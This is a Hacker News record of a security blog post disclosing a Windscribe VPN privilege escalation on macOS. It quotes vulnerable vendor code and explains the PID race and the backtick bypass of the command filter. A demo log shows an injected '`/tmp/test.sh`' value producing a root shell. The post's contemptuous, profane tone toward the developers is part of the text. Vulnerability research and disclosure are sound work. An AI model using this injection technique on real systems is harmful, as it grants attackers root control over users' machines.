{"aid": "40031887", "title": "You shouldn't use a commercial VPN: Amateur hour with Windscribe", "url": "https://gergelykalman.com/why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.html", "domain": "gergelykalman.com", "votes": 3, "user": "ementally", "posted_at": "2024-04-14 15:38:04", "comments": 0, "source_title": "Why you shouldn't use a commercial VPN: Amateur hour with Windscribe", "source_text": "Gergely's hack blog \u2013 Why you shouldn't use a commercial VPN: Amateur hour\nwith Windscribe\n\n# Gergely\n\nI hack things\n\n# Why you shouldn't use a commercial VPN: Amateur hour with Windscribe\n\nPosted on 2024-04-12 in blog\n\n### Intro\n\nThis is a writeup about a user to root privilege escalation due to a race\ncondition in Windscribe VPN's software.\n\n### What is Windscribe?\n\nWindscribe is a smaller VPN provider, they have about 69M users according to\ntheir tweet that was published today.\n\nThey are notorious on X/Twitter for being SuPEr FuNnY in a childish troll\nkind-of way, which understandably rubs a lot of people wrong.\n\nFunnier than their twitter account though, is their codebase which they have\ngraciously made open-source. This is a good move generally speaking, but not\nin this instance as it took me 5 minutes to find code quality that is more in-\nline with a first C++ project than a multi-million dollar company's flagship\nproduct.\n\nBut hey, fuck the coders amirite? Bunch of useless nerds, it's better for\nbusiness if they spend that budget on people who can shitpost on social media.\n\nEnough chit-chat, let's dig in.\n\n> Software: Windscribe VPN\n>\n> Version: 2.9.9\n>\n> Bug: user to root LPE\n>\n> Systems affected: macOS (Linux and Windows are also vulnerable)\n>\n> Requirements: Windscribe VPN installed (account not necessary)\n>\n> Time spent: ~5 hours (not counting writing this)\n>\n> Exploit included: Yes\n>\n> Disclosure type: Full Disclosure\n\n### The codebase\n\nFor a little fun, let's peruse their open-sourced client at\nhttps://github.com/Windscribe/Desktop-App\n\nWe can see that parts of the server-side processing are copy-pasted between\nthe Mac, Linux and Windows versions (processCommand), here are some excerpts\nthat I found pretty alarming.\n\nFeel free to skip ahead, these are just some snippets that I found that\nindicated their lack of expertise in, well, everything really.\n\nHere's some error handling for you:\n\nMac\n\n    \n    \n    int main(int argc, const char *argv[]) { signal(SIGSEGV, handler_sigterm); signal(SIGFPE, handler_sigterm); signal(SIGABRT, handler_sigterm); signal(SIGILL, handler_sigterm); signal(SIGINT, handler_sigterm); signal(SIGTERM, handler_sigterm);\n\nLinux\n\n    \n    \n    signal(SIGSEGV, handler_sigterm); signal(SIGFPE, handler_sigterm); signal(SIGABRT, handler_sigterm); signal(SIGILL, handler_sigterm); signal(SIGINT, handler_sigterm); signal(SIGTERM, handler_sigterm);\n\nHere's some super secure authentication code that relies on the sender's pid\nto fetch the paths and check for the file name:\n\nMac:\n\n    \n    \n    std::vector<std::string> endings; // Check for a correct ending. endings.push_back(\"/Contents/MacOS/installer\"); endings.push_back(\"/Contents/MacOS/Windscribe\"); const auto app_name_length = app_name.length(); // Check bundle name. bool bFoundBundleName = false; for (const auto &ending : endings) { const auto ending_length = ending.length(); if (app_name_length >= ending_length && app_name.compare(app_name_length - ending_length, ending_length, ending) == 0) { bFoundBundleName = true; break; } }\n\nLinux:\n\n    \n    \n    const std::string engineExePath = applicationDirPath() + \"/Windscribe\"; //Logger::instance().out(\"Checking exe path matches engine's: %s\", clientAppPath.c_str()); if (engineExePath.compare(clientAppPath) != 0) { Logger::instance().out(\"Invalid calling application for PID %i, %s\", pid, clientAppPath.c_str()); pid_validity_cache_[pid] = false; return false; }\n\nWindows:\n\n    \n    \n    std::wstring windscribeExePath = getExePath() + std::wstring(L\"\\\\Windscribe.exe\"); if (!iequals(windscribeExePath, path)) { output << \"verifyWindscribeProcessPath invalid process path: \" << std::wstring(path); Logger::instance().out(output.str().c_str()); return false; }\n\nHere is their attempt at preventing command injection (not that openvpn itself\ncould not be used for this, so why even try?):\n\nMac:\n\n    \n    \n    std::string fullCmd = std::string(canonicalPath) + \"/\" + executable + \" \" + arguments; Logger::instance().out(\"Resolved command: %s\", fullCmd.c_str()); free(canonicalPath); if (fullCmd.find(\";\") != std::string::npos || fullCmd.find(\"|\") != std::string::npos || fullCmd.find(\"&\") != std::string::npos) { // Don't execute commands with dangerous pipes or delimiters Logger::instance().out(\"Executable command contains invalid characters, ignoring.\"); return \"\"; }\n\nLinux:\n\n    \n    \n    std::string fullCmd = std::string(canonicalPath) + \"/\" + executable + \" \" + arguments; LOG(\"Resolved command: %s\", fullCmd.c_str()); free(canonicalPath); if (fullCmd.find(\";\") != std::string::npos || fullCmd.find(\"|\") != std::string::npos || fullCmd.find(\"&\") != std::string::npos) { // Don't execute commands with dangerous pipes or delimiters LOG(\"Executable command contains invalid characters, ignoring.\"); return \"\"; }\n\nWindows:\n\n    \n    \n    std::wstring strCmd = L\"\\\"\" + Utils::getExePath() + L\"\\\\\" + cmdRunOpenVpn.szOpenVpnExecutable + L\"\\\"\"; strCmd += L\" --config \\\"\" + filename + L\"\\\" --management 127.0.0.1 \"; strCmd += std::to_wstring(cmdRunOpenVpn.portNumber) + L\" --management-query-passwords --management-hold --verb 3\"; if (wcslen(cmdRunOpenVpn.szHttpProxy.c_str()) > 0) { strCmd += L\" --http-proxy \" + cmdRunOpenVpn.szHttpProxy + L\" \" + std::to_wstring(cmdRunOpenVpn.httpPortNumber) + L\" auto\"; } if (wcslen(cmdRunOpenVpn.szSocksProxy.c_str()) > 0) { strCmd += L\" --socks-proxy \" + cmdRunOpenVpn.szSocksProxy + L\" \" + std::to_wstring(cmdRunOpenVpn.socksPortNumber); } return ExecuteCmd::instance().executeUnblockingCmd(strCmd, L\"\", Utils::getDirPathFromFullPath(filename));\n\nIf the code snippets look similar between platforms is because they are, they\nare usually just copy-pasted between them. This happens between Mac and Linux\nthe most as they're similar but Windows is not better, it's just different.\n\nGenerally desktop VPN software is an easy target, but Windscribe is on a whole\nother level of bad.\n\n### The privileged helper\n\nThe Windscribe helper on macOS called com.windscribe.launcher.macos runs as\nroot and takes commands from the desktop client on a UNIX socket at\n/var/run/windscribe_helper_socket2.\n\nThis works similarly on other OSes as well, I only looked at the mac version,\nbut Linux is pretty much 1-1 and Windows is not much better.\n\n### The LPE bug(s)\n\nThe privileged helper relies on checking the sender's PID and performing\nchecks on the sender's program path. It even does signature verification on\nit.\n\nWhile this sounds good in theory, it's completely useless. Anyone with a brain\nknows that PID checking is racy, meaning: an attacker can execute the\nauthorized binary right after sending their malicious payload, bypassing every\ncheck.\n\nThe software also uses the boost C++ library to pass structured data between\nthese processes. This library was never meant to work with untrusted data, so\nwe can corrupt the helper's memory, but there's an easier way for us to\nexecute commands as root.\n\nSince Windscribe calls openvpn/wireguard/etc... in subshells it is trivial to\ninject our payload to gain root command execution. They made a ridiculous\nattempt at preventing this (filtering \";|&\" characters, but they forgot the\nmost basic one: \"`\". This can be used to execute our payload.\n\nIn all fairness this would never work, as it's a bad architectural decision.\nInvoking subshells is a massive can of worms and securing it is difficult and\nerror-prone. Not to mention that the command invoked (openvpn) is vulnerable\nto misuse if the arguments are attacker-controlled.\n\nThis is bad design, an attacker controlling any parameter to openvpn is pretty\nmuch a slam-dunk vulnerability, so I have no idea why they have this in the\nfirst place.\n\n### But this is just the mac right?\n\nI did not test the other platforms, but Linux and Windows works similarly\n(they both validate the pid). It's unlikely that these platforms are not\nvulnerable, and even if they aren't it wouldn't take much work to find\nsomething else that is wrong.\n\nWriting exploits for these other platforms is up to other researchers, but if\nyou do take this on, please drop me a DM on X/Twitter.\n\n### Further research\n\nThe code is full of antipatterns and lazy/naive solutions, so I wouldn't be\nshocked if someone takes a bit more time than I did and floods the company\nwith new 0days every week.\n\nThere's plenty of opportunity here, starting by replicating my results on the\nother platforms.\n\nAs far a targets go, I have seen tougher beginner wargames.\n\n### Why didn't I report this to their bug bounty?\n\nBecause the company has a history of not paying researchers (from what I've\nbeen told privately) and their maximum payout of $5000 is not worth months of\nmy time going back-and-forth with their team who created this masterpiece of\nengineering in the first place.\n\nI'd much rather have their customers realize how dangerous this software is to\nthem than to report the bug and get gagged by an NDA.\n\n### Verdict\n\nThis is a pretty clear-cut reason why you should never install commercial VPNs\nif you can help it. Not only will they not give you extra privacy, they will\ninstall software that is roughly the same quality, often written by people who\nhave no idea what they're doing.\n\nSome of these companies plainly don't give a flying fuck about you or your\ncomputer, and in egregious cases (such as Windscribe) they will actually tell\nthis to your face on social media. Talk about adding insult to injury.\n\nI did publish this piece and did the research to prove that commercial VPN\nsoftware is low-quality garbage. While I can only speak for certain about\nWindscribe here, in my experience the others are not much better.\n\nWhile it's true that privileged daemons (required for VPNs) are hard to get\nright, it's also not impossible. Nevertheless, I do not expect any security\nproduct to worsen my security-posture, let alone something I paid for. The\nfact that this software is written with the understanding of a first-year CS\nstudent is pretty crazy.\n\nWhen I think about their 69M subscribers who have this software running with\nthe highest privileges on their systems, this gets a lot less funny, really,\nreally quickly.\n\n### Demo\n\n    \n    \n    $ ./windscribe_attitude_check.py [+] Preparing [+] Opening windscribe log file [+] Launching exploit [+] Try 0/100 [?] LOGLINE [120424 12:22:29:000] [service] client app connected [?] LOGLINE [120424 12:22:29:000] [service] HelperSecurity::verifyProcessId: new PID 96804 [?] LOGLINE [120424 12:22:29:000] [service] Invalid app/bundle name for PID 96804: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python' [?] LOGLINE [120424 12:22:29:000] [service] client app disconnected [+] Try 1/100 [?] LOGLINE [120424 12:22:29:000] [service] client app connected [?] LOGLINE [120424 12:22:29:000] [service] HelperSecurity::verifyProcessId: new PID 96805 [?] LOGLINE [120424 12:22:29:000] [service] Invalid app/bundle name for PID 96805: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python' [?] LOGLINE [120424 12:22:29:000] [service] client app disconnected [+] Try 2/100 [?] LOGLINE [120424 12:22:29:000] [service] client app connected [?] LOGLINE [120424 12:22:29:000] [service] HelperSecurity::verifyProcessId: new PID 96806 [?] LOGLINE [120424 12:22:29:000] [service] Invalid app/bundle name for PID 96806: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python' [?] LOGLINE [120424 12:22:29:000] [service] client app disconnected [+] Try 3/100 [?] LOGLINE [120424 12:22:30:000] [service] client app connected [?] LOGLINE [120424 12:22:30:000] [service] HelperSecurity::verifyProcessId: new PID 96807 [?] LOGLINE [120424 12:22:30:000] [service] Invalid app/bundle name for PID 96807: '/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Resources/Python.app/Contents/MacOS/Python' [?] LOGLINE [120424 12:22:30:000] [service] client app disconnected ... [+] Try 61/100 [?] LOGLINE [120424 12:22:36:000] [service] client app connected [?] LOGLINE [120424 12:22:36:000] [service] HelperSecurity::verifyProcessId: new PID 96865 [?] LOGLINE [120424 12:22:36:000] [service] Resolved command: /Applications/Windscribe.app/Contents/Helpers/windscribeopenvpn --config /etc/windscribe/config.ovpn `/tmp/test.sh` [+] Try 62/100 [?] LOGLINE [120424 12:22:36:000] [service] client app disconnected [+] PWNED :) [+] Spawning shell The default interactive shell is now zsh. To update your account to use zsh, please run `chsh -s /bin/zsh`. For more details, please visit https://support.apple.com/kb/HT208050. bash-3.2#\n\n### Exploit code\n\nhttps://github.com/gergelykalman/windscribe-attitude-check\n\nmacOS 0day VPN Windscribe\n\n\u00a9 2024\n\nBuilt with Pelican using Flex theme | Switch to the dark | light | browser theme\n\n", "frontpage": false}
